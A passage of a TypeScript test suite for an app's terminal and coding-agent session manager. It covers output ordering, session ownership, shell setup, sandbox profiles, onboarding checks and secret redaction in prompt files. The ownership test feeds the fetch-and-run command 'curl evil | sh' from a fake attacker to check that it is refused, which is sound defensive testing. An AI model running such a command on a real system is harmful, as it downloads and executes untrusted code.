      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      const h = handlers as PtySessionHandlers | null;
      for (let i = 1; i <= 20; i += 1) h?.onData(`chunk-${i};`);
      const received = () =>
        send.mock.calls
          .filter(([channel]) => channel === PTY_CHANNELS.data)
          .map(([, e]) => e as { sessionId: string; data: string; sequence: number; firstSequence?: number });
      const covered = () => received().flatMap(coveredSequences);
      // Os dois primeiros saem direto; o resto fica retido para sair junto.
      expect(received().map((e) => e.sequence)).toEqual([1, 2]);

      // Renderer acka só o que recebeu, como o preload faz — sem pty:recover.
      let guard = 0;
      while (covered().length < 20 && guard < 10) {
        acknowledgeSessionOutput(owner, sessionId, received().at(-1)!.sequence);
        guard += 1;
      }
      expect(covered()).toEqual(Array.from({ length: 20 }, (_, i) => i + 1));
      // Bytes na mesma ordem, uma única vez, em bem menos de 20 mensagens.
      expect(received().map((e) => e.data).join("")).toBe(
        Array.from({ length: 20 }, (_, i) => `chunk-${i + 1};`).join(""),
      );
      expect(received().length).toBeLessThanOrEqual(3);
      expect(received().every((e) => e.sessionId === sessionId)).toBe(true);
      // Ack final não re-envia nada.
      const sent = received().length;
      acknowledgeSessionOutput(owner, sessionId, 20);
      expect(received()).toHaveLength(sent);
    } finally {
      warn.mockRestore();
      orchKillSession(sessionId);
    }
  });

  it("chunk novo não fura a fila: com pausados pendentes, sai depois deles", () => {
    let handlers: PtySessionHandlers | null = null;
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          terminate: vi.fn(async () => ({ ok: false, rootExited: false, descendantsExited: false })),
        };
      },
    });
    const send = vi.fn();
    const owner = { isDestroyed: () => false, isCrashed: () => false, send } as unknown as WebContents;
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      const h = handlers as PtySessionHandlers | null;
      for (let i = 1; i <= 12; i += 1) h?.onData(`c${i}`);
      const events = () =>
        send.mock.calls
          .filter(([channel]) => channel === PTY_CHANNELS.data)
          .map(([, e]) => e as { sequence: number; firstSequence?: number; data: string });
      const seqs = () => events().flatMap(coveredSequences);
      expect(seqs()).toEqual([1, 2]);
      // O ack libera a janela: os retidos 3..12 saem JUNTOS e em ordem.
      acknowledgeSessionOutput(owner, sessionId, 1);
      expect(seqs()).toEqual(Array.from({ length: 12 }, (_, i) => i + 1));
      expect(events().at(-1)).toMatchObject({ firstSequence: 3, sequence: 12 });
      // Já há 2 mensagens em voo: o chunk novo não fura a fila, espera o ack.
      h?.onData("c13");
      expect(seqs()).toEqual(Array.from({ length: 12 }, (_, i) => i + 1));
      acknowledgeSessionOutput(owner, sessionId, 12);
      expect(seqs()).toEqual(Array.from({ length: 13 }, (_, i) => i + 1));
      expect(events().map((e) => e.data).join("")).toBe(
        Array.from({ length: 13 }, (_, i) => `c${i + 1}`).join(""),
      );
    } finally {
      warn.mockRestore();
      orchKillSession(sessionId);
    }
  });

  it("saída do processo com cauda pausada: o renderer recebe 1..20 em ordem antes do pty:exit", async () => {
    let handlers: PtySessionHandlers | null = null;
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          terminate: vi.fn(async () => ({ ok: true, rootExited: true, descendantsExited: true })),
        };
      },
    });
    const send = vi.fn();
    const owner = { isDestroyed: () => false, isCrashed: () => false, send } as unknown as WebContents;
    const trusted = trustedSpawn();
    spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      const h = handlers as PtySessionHandlers | null;
      for (let i = 1; i <= 20; i += 1) h?.onData(`line-${i}\n`);
      h?.onExit(0);
      await vi.waitFor(() => {
        expect(send.mock.calls.some(([channel]) => channel === PTY_CHANNELS.exit)).toBe(true);
      });
      const stream = send.mock.calls
        .filter(([channel]) => channel === PTY_CHANNELS.data || channel === PTY_CHANNELS.exit)
        .flatMap<string | number>(([channel, e]) =>
          channel === PTY_CHANNELS.exit
            ? ["exit"]
            : coveredSequences(e as { sequence: number; firstSequence?: number }),
        );
      expect(stream).toEqual([...Array.from({ length: 20 }, (_, i) => i + 1), "exit"]);
    } finally {
      warn.mockRestore();
    }
  });

  it("only the owning WebContents can write to / kill a session", async () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();

    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const proc = h.procFor(sessionId);

    // A different renderer (or a session id it guessed) is refused: no bytes reach the PTY.
    writeSession(attacker, sessionId, "curl evil | sh\n");
    expect(proc.write).not.toHaveBeenCalled();

    // The owner writes normally.
    writeSession(owner, sessionId, "ls\n");
    expect(proc.write).toHaveBeenCalledWith("ls\n");

    // A foreign kill is a no-op; the session stays live.
    killSession(attacker, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(getSessionState(sessionId)).not.toBeNull();

    // The owner kills it.
    killSession(owner, sessionId);
    expect(proc.terminate).toHaveBeenCalledTimes(1);
    await orchTerminateSession(sessionId);
    expect(getSessionState(sessionId)).toBeNull();
  });

  it("spawns the operator shell as a login shell (-l) so the account PATH loads", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      fakeWc(),
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    // Sem -l o zsh não lê .zprofile/.zlogin: homebrew e ~/.local/bin somem do
    // PATH do pane — fricção direta no vibecode (foi o bash-3.2 pelado de campo).
    expect(h.specFor(sessionId).args[0]).toBe("-l");
    orchKillSession(sessionId);
  });

  it.each([
    'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
    'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    'C:\\Windows\\System32\\cmd.exe',
  ])('selects no Unix login arguments for Windows operator shell %s', (shell) => {
    expect(operatorShellLoginArgs(shell, {})).toEqual([]);
  });

  it.runIf(process.platform === 'win32')(
    'preserves Windows Path spelling in the shell environment',
    () => {
      // Node keeps the inherited key spelling (`Path`) on Windows. A
      // case-sensitive allowlist silently dropped it, leaving every CLI
      // installed by npm unreachable inside Nexus shells.
      const inheritedPath = Object.entries(process.env).find(
        ([key]) => key.toLowerCase() === 'path',
      );
      for (const [key] of Object.entries(process.env)) {
        if (key.toLowerCase() === 'path') delete process.env[key];
      }
      process.env.Path = 'C:\\Nexus\\cli';
      try {
        const h = fakeHost();
        setPtyHost(h.host);
        const trusted = trustedSpawn();
        const { sessionId } = spawnSession(
          fakeWc(),
          { kind: 'shell', cols: 80, rows: 24 },
          {
            scope: trusted.scope,
            cwd: trusted.cwd,
            shell: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
          },
        );

        expect(h.specFor(sessionId).env.Path).toBe('C:\\Nexus\\cli');
        orchKillSession(sessionId);
      } finally {
        for (const [key] of Object.entries(process.env)) {
          if (key.toLowerCase() === 'path') delete process.env[key];
        }
        if (inheritedPath) process.env[inheritedPath[0]] = inheritedPath[1];
      }
    },
  );

  it.runIf(process.platform === 'win32')(
    'starts a long-argument Codex pane through node instead of its npm cmd shim',
    () => {
      // F-206: npm's codex.cmd is interpreted by cmd.exe, whose command line
      // limit is smaller than the hook configuration Nexus appends. The native
      // node executable accepts the same entry point without that batch limit.
      windowsNpmShimLaunch.launch = {
        file: 'C:\\Node\\node.exe',
        argsPrefix: ['C:\\Node\\node_modules\\@openai\\codex\\bin\\codex.js'],
      };
      const h = fakeHost();
      setPtyHost(h.host);
      const owner = fakeWc();
      let sessionId: string | null = null;
      try {
        const spawned = spawnAgentSession(
          owner,
          { kind: 'cli-agent', cols: 80, rows: 24 },
          makeCodexAdapter(),
          {},
          trustedSpawn(),
        );
        sessionId = spawned.sessionId;
        const spec = h.specFor(sessionId);

        expect(spec.file).toBe('C:\\Node\\node.exe');
        expect(spec.args).toEqual(
          expect.arrayContaining([
            'C:\\Node\\node_modules\\@openai\\codex\\bin\\codex.js',
          ]),
        );
      } finally {
        if (sessionId) killSession(owner, sessionId);
        windowsNpmShimLaunch.launch = null;
      }
    },
  );

  it("does not authorize replacement until the PTY host proves physical exit", async () => {
    let handlers: PtySessionHandlers | null = null;
    let resolveProof!: (proof: {
      ok: true;
      rootExited: true;
      descendantsExited: true;
    }) => void;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(
        () =>
          new Promise<{
            ok: true;
            rootExited: true;
            descendantsExited: true;
          }>((resolve) => {
            resolveProof = resolve;
          }),
      ),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const replacement = vi.fn();
    const termination = orchTerminateSession(sessionId, {
      termTimeoutMs: 10_000,
      killTimeoutMs: 10_000,
    });
    void termination.then((exited) => {
      if (exited) replacement();
    });

    expect(proc.terminate).toHaveBeenCalledWith({
      termTimeoutMs: 10_000,
      killTimeoutMs: 10_000,
    });
    expect(getSessionState(sessionId)).not.toBeNull();
    expect(orchWriteSession(sessionId, "late command\r")).toBe(false);
    (handlers as PtySessionHandlers | null)?.onData("late output");
    await Promise.resolve();
    expect(replacement).not.toHaveBeenCalled();
    expect(
      send.mock.calls.some(([channel]) => channel === PTY_CHANNELS.data),
    ).toBe(false);

    (handlers as PtySessionHandlers | null)?.onExit(0, 15);
    resolveProof({
      ok: true,
      rootExited: true,
      descendantsExited: true,
    });
    await expect(termination).resolves.toBe(true);
    expect(getSessionState(sessionId)).toBeNull();
    expect(replacement).toHaveBeenCalledOnce();
  });
});

describe('managed Claude auth capability at the physical spawn boundary', () => {
  it.each([false, true])('requires secure-storage support only for managed profiles (supported=%s)', async (supported) => {
    setSquadCliPolicyLookupForTests(() => 'operator-choice');
    setAgentSpawnHook(null);
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'claude-auth-capability-'));
    const binary = path.join(root, 'claude');
    fs.writeFileSync(binary, supported ? 'CLAUDE_SECURESTORAGE_CONFIG_DIR' : 'older CLI');
    fs.chmodSync(binary, 0o700);
    const host = fakeHost();
    setPtyHost(host.host);
    let sessionId: string | undefined;
    try {
      const spawn = () => {
        const session = spawnAgentSession(fakeWc(), { kind: 'cli-agent', cols: 80, rows: 24 },
          builtinCliPtyAdapter('claude'), { binPath: binary, keyEnv: {
            CLAUDE_SECURESTORAGE_CONFIG_DIR: path.join(root, 'account-auth'),
          } }, trustedSpawn(fs.realpathSync(root)));
        sessionId = session.sessionId;
      };
      if (supported) {
        expect(spawn).not.toThrow();
        expect(host.specFor(sessionId!).env.CLAUDE_SECURESTORAGE_CONFIG_DIR).toBe(path.join(root, 'account-auth'));
      } else expect(spawn).toThrow(/CLAUDE_SECURESTORAGE_CONFIG_DIR/);
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});

describe("F-243: janela de auto-compactação do Maestro Claude", () => {
  async function spawnWithEnv(
    adapterId: string,
    authority: BoundSpawnAuthority,
  ): Promise<{ sessionId: string; env: NodeJS.ProcessEnv }> {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "f243-spawn-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree, { recursive: true });
    const scopedAuthority: BoundSpawnAuthority = {
      ...authority,
      cwd: fs.realpathSync.native(worktree),
      scope: { ...authority.scope, rootRealPath: fs.realpathSync.native(worktree) },
      coordinationScope: {
        ...authority.scope,
        rootRealPath: fs.realpathSync.native(path.dirname(worktree)),
      },
    };
    const host = fakeHost();
    setPtyHost(host.host);
    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      builtinCliPtyAdapter(adapterId),
      {},
      scopedAuthority,
    );
    const env = host.specFor(sessionId).env;
    await orchTerminateSession(sessionId);
    fs.rmSync(root, { recursive: true, force: true });
    return { sessionId, env };
  }

  it("orquestrador claude de missão recebe 400k; worker claude e operador não", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    setAgentSpawnHook(null);
    const worker = revisionBoundWorker();
    const orchestrator: BoundSpawnAuthority = {
      ...worker,
      context: { ...worker.context!, role: "orchestrator" },
    };

    const maestro = await spawnWithEnv("claude", orchestrator);
    expect(maestro.env.CLAUDE_CODE_AUTO_COMPACT_WINDOW).toBe("400000");

    const workerEnv = await spawnWithEnv("claude", revisionBoundWorker());
    expect(workerEnv.env.CLAUDE_CODE_AUTO_COMPACT_WINDOW).toBeUndefined();

    const operatorEnv = await spawnWithEnv("claude", trustedSpawn());
    expect(operatorEnv.env.CLAUDE_CODE_AUTO_COMPACT_WINDOW).toBeUndefined();
  });

  it("adapter host-Claude (glm) mantém a janela que ele já define", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    setAgentSpawnHook(null);
    const worker = revisionBoundWorker();
    const orchestrator: BoundSpawnAuthority = {
      ...worker,
      context: { ...worker.context!, role: "orchestrator" },
    };
    const glm = await spawnWithEnv("glm", orchestrator);
    expect(glm.env.CLAUDE_CODE_AUTO_COMPACT_WINDOW).toBe("1000000");
  });
});

function completedAgyFixtureHome(root: string): string {
  const source = path.join(root, 'agy-source');
  const cache = path.join(source, 'antigravity-cli', 'cache');
  fs.mkdirSync(cache, { recursive: true });
  fs.writeFileSync(path.join(cache, 'onboarding.json'), JSON.stringify({
    onboardingComplete: true, consumerOnboardingComplete: true, enterpriseOnboardingComplete: false,
  }));
  return source;
}

describe('F-1642 AGY onboarding at physical spawn', () => {
  it.each([
    { mode: 'worker pending', completed: false, direct: false, child: false, heal: false, denied: true },
    { mode: 'worker recorded consumer completion', completed: true, direct: false, child: false, heal: false, denied: false },
    { mode: 'operator may complete onboarding', completed: false, direct: true, child: false, heal: false, denied: false },
    { mode: 'automated operator child pending', completed: false, direct: true, child: true, heal: false, denied: true },
    { mode: 'existing pending checkout healed without changing opt-out', completed: true, direct: false, child: false, heal: true, denied: false },
    { mode: 'legacy settings hardlink with recorded completion', completed: true, direct: false, child: false, heal: false, legacy: true, denied: false },
    { mode: 'pending after decoration releases MCP resources', completed: true, direct: false, child: false, heal: false, latePending: true, denied: true },
  ])('$mode', async scenario => {
    setSquadCliPolicyLookupForTests(() => 'operator-choice');
    const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'nexus-agy-startup-')));
    const home = path.join(root, 'home');
    const cwd = path.join(home, 'project');
    const source = path.join(home, '.gemini');
    const cache = path.join(source, 'antigravity-cli', 'cache');
    fs.mkdirSync(cwd, { recursive: true });
    fs.mkdirSync(cache, { recursive: true });
    vi.stubEnv('HOME', home);
    vi.stubEnv('USERPROFILE', home);
    const pending = JSON.stringify({ onboardingComplete: false, consumerOnboardingComplete: false, enterpriseOnboardingComplete: false });
    const completed = JSON.stringify({ onboardingComplete: true, consumerOnboardingComplete: true, enterpriseOnboardingComplete: false });
    fs.writeFileSync(path.join(cache, 'onboarding.json'), scenario.completed ? completed : pending);
    const settings = '{"enableTelemetry":false}';
    fs.writeFileSync(path.join(source, 'antigravity-cli', 'settings.json'), settings);
    if (scenario.heal) {
      const initial = prepareCheckoutProviderHome('agy', { userDataPath: app.getPath('userData'), checkoutId: 'checkout-test', sourceHome: source });
      fs.writeFileSync(path.join(initial.env.GEMINI_CLI_HOME, 'antigravity-cli', 'cache', 'onboarding.json'), pending);
    }
    if (scenario.legacy) {
      const initial = prepareCheckoutProviderHome('agy', { userDataPath: app.getPath('userData'), checkoutId: 'checkout-test', sourceHome: source });
      const projectedSettings = path.join(initial.env.GEMINI_CLI_HOME, 'antigravity-cli', 'settings.json');
      fs.unlinkSync(projectedSettings);
      fs.linkSync(path.join(source, 'antigravity-cli', 'settings.json'), projectedSettings);
    }
    const baseAuthority = scenario.direct ? trustedSpawn(cwd) : revisionBoundWorker(cwd);
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      context: scenario.child
        ? { operatorParentSessionId: 'parent', allowedTools: null, allowedSkills: null }
        : scenario.direct ? null : { ...baseAuthority.context!, allowedTools: null, allowedSkills: null },
    };
    let decorationCalls = 0;
    const artifact = path.join(root, 'mcp-lease');
    setAgentSpawnHook(() => {
      decorationCalls++;
      if (!scenario.latePending) return null;
      const projected = prepareCheckoutProviderHome('agy', { userDataPath: app.getPath('userData'), checkoutId: 'checkout-test', sourceHome: source });
      fs.writeFileSync(path.join(projected.env.GEMINI_CLI_HOME, 'antigravity-cli', 'cache', 'onboarding.json'), pending);
      fs.writeFileSync(artifact, 'fixture lease');
      return { authorityToken: 'fixture', env: {}, extraArgs: [], onSpawnFailed: () => fs.unlinkSync(artifact) };
    });
    const host = fakeHost();
    setPtyHost(host.host);
    let sessionId: string | undefined;
    try {
      const spawn = () => {
        const result = spawnAgentSession(fakeWc(), { kind: 'cli-agent', cols: 80, rows: 24 },
          builtinCliPtyAdapter('agy'), { keyEnv: { GEMINI_CLI_HOME: source } }, authority);
        sessionId = result.sessionId;
        return result;
      };
      if (scenario.denied) {
        expect(spawn).toThrowError(expect.objectContaining({ code: 'onboarding_pending' }));
        expect(decorationCalls).toBe(scenario.latePending ? 1 : 0);
        expect(sessionId).toBeUndefined();
        expect(fs.existsSync(artifact)).toBe(false);
      } else {
        spawn();
        expect(decorationCalls).toBe(1);
        const providerHome = host.specFor(sessionId!).env.GEMINI_CLI_HOME!;
        expect(providerHome).not.toBe(source);
        expect(fs.readFileSync(path.join(providerHome, 'antigravity-cli', 'settings.json'), 'utf8')).toBe(settings);
        if (scenario.completed) expect(fs.readFileSync(path.join(providerHome, 'antigravity-cli', 'cache', 'onboarding.json'), 'utf8')).toBe(completed);
      }
      expect(fs.readFileSync(path.join(source, 'antigravity-cli', 'settings.json'), 'utf8')).toBe(settings);
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      setAgentSpawnHook(null);
      vi.unstubAllEnvs();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});

describe("AGY advisory native profile", () => {
  const macosIt = process.platform === "darwin" ? it : it.skip;

  macosIt(
    "isolates AGY HOME and grants only checkout state, shared config and native Keychain",
    async () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-agy-native-profile-"),
      );
      const worktree = path.join(root, "project", "worktree");
      const nativeHome = path.join(root, "native-home");
      const isolatedElectronHome = path.join(root, "electron-home");
      const geminiHome = path.join(nativeHome, ".gemini");
      const agyState = path.join(geminiHome, "antigravity-cli");
      const keychains = path.join(nativeHome, "Library", "Keychains");
      const nativeMcpConfig = path.join(agyState, "mcp_config.json");
      const binary = path.join(root, "bin", "agy");
      fs.mkdirSync(worktree, { recursive: true });
      fs.mkdirSync(isolatedElectronHome, { recursive: true });
      fs.mkdirSync(agyState, { recursive: true });
      fs.mkdirSync(keychains, { recursive: true });
      fs.mkdirSync(path.dirname(binary), { recursive: true });
      fs.writeFileSync(binary, "#!/bin/sh\n");
      fs.chmodSync(binary, 0o755);
      fs.writeFileSync(
        nativeMcpConfig,
        '{"mcpServers":{"existing":{"command":"leave-me-alone"}}}\n',
      );
      const originalMcpConfig = fs.readFileSync(nativeMcpConfig);
      const nativeUser = os.userInfo();
      const userInfoSpy = vi.spyOn(os, "userInfo").mockReturnValue({
        ...nativeUser,
        homedir: nativeHome,
      });
      vi.stubEnv("HOME", isolatedElectronHome);
      setAgentSpawnHook(null);
      const host = fakeHost();
      setPtyHost(host.host);
      const baseAuthority = revisionBoundWorker(
        fs.realpathSync.native(worktree),
      );
      const authority: BoundSpawnAuthority = {
        ...baseAuthority,
        context: {
          ...baseAuthority.context!,
          readOnly: true,
          nativeReadOnly: false,
        },
      };
      let sessionId: string | null = null;

      try {
        ({ sessionId } = spawnMainOwnedAgentSession(
          {
            kind: "cli-agent",
            paneId: "agy-native-profile",
            cols: 100,
            rows: 30,
          },
          builtinCliPtyAdapter("agy"),
          { binPath: binary },
          authority,
        ));

        const spec = host.specFor(sessionId);
        const profile = spec.args[1] ?? "";
        const writeSection = profile.slice(
          profile.indexOf("(allow file-write*"),
          profile.indexOf("(deny file-read*"),
        );
        const readSection = profile.slice(profile.indexOf("(deny file-read*"));

        expect(spec.file).toBe("/usr/bin/sandbox-exec");
        expect(spec.cwd).toBe(fs.realpathSync.native(worktree));
        expect(spec.env.HOME).toContain(path.join("provider-state", "agy", "checkout-test"));
        expect(spec.env.HOME).not.toBe(
          fs.realpathSync.native(isolatedElectronHome),
        );
        expect(profile).toContain("(allow network*)");
        expect(readSection).not.toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(geminiHome))})`,
        );
        expect(readSection).toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(keychains))})`,
        );
        expect(writeSection).not.toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(agyState))})`,
        );
        expect(writeSection).not.toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(geminiHome))})`,
        );
        expect(writeSection).toContain(JSON.stringify(fs.realpathSync(spec.env.HOME!)));
        expect(readSection).toContain(JSON.stringify(fs.realpathSync(nativeMcpConfig)));
        expect(writeSection).not.toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(keychains))})`,
        );
        expect(spec.args.slice(spec.args.indexOf(binary) + 1)).not.toContain("--mcp-config");
        expect(spec.env.GEMINI_CLI_HOME).toContain(path.join("provider-state", "agy", "checkout-test"));
        expect(fs.readFileSync(nativeMcpConfig).equals(originalMcpConfig)).toBe(
          true,
        );
        expect(fs.readdirSync(isolatedElectronHome)).toEqual([]);
      } finally {
        if (sessionId) await orchTerminateSession(sessionId);
        userInfoSpy.mockRestore();
        vi.unstubAllEnvs();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  macosIt(
    "keeps AGY checkout HOME for a frictionless read-only worker without Seatbelt",
    async () => {
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-agy-frictionless-"),
      );
      const worktree = path.join(root, "project", "worktree");
      const nativeHome = path.join(root, "native-home");
      const electronHome = path.join(root, "electron-home");
      const legacyGeminiHome = path.join(root, "legacy-gemini-home");
      fs.mkdirSync(worktree, { recursive: true });
      fs.mkdirSync(nativeHome, { recursive: true });
      fs.mkdirSync(electronHome, { recursive: true });
      fs.mkdirSync(legacyGeminiHome, { recursive: true });
      const nativeUser = os.userInfo();
      const userInfoSpy = vi.spyOn(os, "userInfo").mockReturnValue({
        ...nativeUser,
        homedir: nativeHome,
      });
      vi.stubEnv("HOME", electronHome);
      vi.stubEnv("USERPROFILE", electronHome);
      setAgentSpawnHook(null);
      const host = fakeHost();
      setPtyHost(host.host);
      const baseAuthority = revisionBoundWorker(
        fs.realpathSync.native(worktree),
      );
      const initialPrompt =
        "Inspecione o projeto.\n\n### NEXUS_HANDOFF v1\n{\"status\":\"done\"}";
      const authority: BoundSpawnAuthority = {
        ...baseAuthority,
        context: {
          ...baseAuthority.context!,
          readOnly: true,
          nativeReadOnly: false,
          initialPrompt,
        },
      };
      let sessionId: string | null = null;

      try {
        ({ sessionId } = spawnMainOwnedAgentSession(
          {
            kind: "cli-agent",
            paneId: "agy-frictionless-native-profile",
            cols: 100,
            rows: 30,
          },
          builtinCliPtyAdapter("agy"),
          { keyEnv: { GEMINI_CLI_HOME: legacyGeminiHome } },
          authority,
        ));

        const spec = host.specFor(sessionId);
        const expectedHome = fs.realpathSync.native(nativeHome);
        expect(spec.file).toBe("/mock/bin/agy");
        expect(spec.args).toContain("--dangerously-skip-permissions");
        // F-1476: o brief vai pela TUI ao vivo, nunca pelo --print bufferizado.
        expect(spec.args.filter((arg) => arg === "--prompt-interactive")).toHaveLength(1);
        expect(spec.args[spec.args.indexOf("--prompt-interactive") + 1]).toBe(initialPrompt);
        expect(spec.args.filter((arg) => arg === "--add-dir")).toHaveLength(1);
        expect(spec.args[spec.args.indexOf("--add-dir") + 1]).toBe(
          fs.realpathSync.native(worktree),
        );
        expect(spec.args).not.toContain("--print");
        expect(spec.args).not.toContain("/usr/bin/sandbox-exec");
        expect(spec.env.HOME).not.toBe(expectedHome);
        expect(spec.env.USERPROFILE).toBe(spec.env.HOME);
        expect(spec.env.GEMINI_CLI_HOME).toContain(path.join("provider-state", "agy", "checkout-test"));
      } finally {
        if (sessionId) await orchTerminateSession(sessionId);
        userInfoSpy.mockRestore();
        vi.unstubAllEnvs();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("entrega a tarefa no argv do claude — o pane nasce executando", async () => {
    // Paridade Overclock: a tarefa viaja no spawn. agy/codex/opencode já faziam
    // isso; claude — o CLI mais usado — ficava de fora e nascia ocioso,
    // esperando injeção pós-boot (espera de TUI + round trip). No caminho
    // simples isso não é otimização, é o modelo.
    //
    // MEDIÇÃO NÃO VERIFICADA: o ganho em segundos NÃO foi medido com pane vivo
    // (o app empacotado hospeda a frota e não expõe CDP). Este teste prova o
    // ARGV, não a economia. Ver docs/analysis/2026-08-06-refatoracao-execucao-simples.md §8.
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-claude-argv-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const host = fakeHost();
    setPtyHost(host.host);
    const baseAuthority = revisionBoundWorker(fs.realpathSync.native(worktree));
    const initialPrompt = "Implemente a story 1.2 e chame nexus_handoff_submit.";
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      context: { ...baseAuthority.context!, initialPrompt },
    };
    let sessionId: string | null = null;
    try {
      ({ sessionId } = spawnMainOwnedAgentSession(
        { kind: "cli-agent", paneId: "claude-argv-birth", cols: 100, rows: 30 },
        builtinCliPtyAdapter("claude"),
        {},
        authority,
      ));
      const spec = host.specFor(sessionId);
      expect(spec.args.filter((a) => a === initialPrompt)).toHaveLength(1);
      // Posicional ÚNICO — mas não necessariamente o último: flags governadas
      // (ex.: --dangerously-skip-permissions) ainda são anexadas depois, e o
      // parser da CLI aceita flag após posicional. Exigir "último" seria fixar
      // uma restrição que a CLI não tem.
      expect(
        spec.args.filter((a) => a === initialPrompt),
      ).toHaveLength(1);
      // Nunca headless: o worker precisa do turno interativo.
      expect(spec.args).not.toContain("--print");
      expect(spec.args).not.toContain("-p");
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.each(["claude", "grok", "mimo-code"])("F-1316: %s large native prompt is a private redacted file, removed after physical exit", async adapterId => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-file-brief-"));
    const host = fakeHost();
    setPtyHost(host.host);
    const base = revisionBoundWorker(fs.realpathSync.native(root));
    const prompt = "Implemente a tarefa.\n" + "contexto ".repeat(4_000) + "\nOPENAI_API_KEY=sk-" + "a".repeat(48);
    let sessionId: string | undefined;
    let briefPath: string | undefined;
    try {
      ({ sessionId } = spawnMainOwnedAgentSession(
        { kind: "cli-agent", paneId: "large-brief", cols: 100, rows: 30 },
        builtinCliPtyAdapter(adapterId), {},
        { ...base, context: { ...base.context!, initialPrompt: prompt } },
      ));
      const spec = host.specFor(sessionId);
      expect(spec.args).not.toContain(prompt);
      const pointer = spec.args.find(arg => arg.startsWith("Leia e siga integralmente o brief em "));
      expect(pointer).toBeDefined();
      briefPath = JSON.parse(pointer!.slice("Leia e siga integralmente o brief em ".length));
      expect(briefPath!.startsWith(path.join(app.getPath("userData"), "briefs") + path.sep)).toBe(true);
      const content = fs.readFileSync(briefPath!, "utf8");
      expect(content).toContain("contexto ".repeat(4_000));
      expect(content).not.toContain("sk-" + "a".repeat(48));
      if (process.platform !== "win32") expect(fs.statSync(briefPath!).mode & 0o777).toBe(0o600);
      await orchTerminateSession(sessionId);
      sessionId = undefined;
      expect(fs.existsSync(briefPath!)).toBe(false);
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("F-984 × F-1316: brief normal de writer (4189 chars) chega íntegro no argv", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-argv-brief-"));
    const host = fakeHost();
    setPtyHost(host.host);
    const base = revisionBoundWorker(fs.realpathSync.native(root));
    const brief = "## Nexus execution authority\n" + "b".repeat(4_160);
    try {
      const { sessionId } = spawnMainOwnedAgentSession(
        { kind: "cli-agent", paneId: "argv-brief", cols: 100, rows: 30 },
        builtinCliPtyAdapter("claude"), {},
        { ...base, context: { ...base.context!, initialPrompt: brief } },
      );
      const spec = host.specFor(sessionId);
      expect(spec.args.some(arg => arg.startsWith("Leia e siga integralmente o brief em "))).toBe(false);
      expect(spec.args.some(arg => arg.includes("b".repeat(4_160)))).toBe(true);
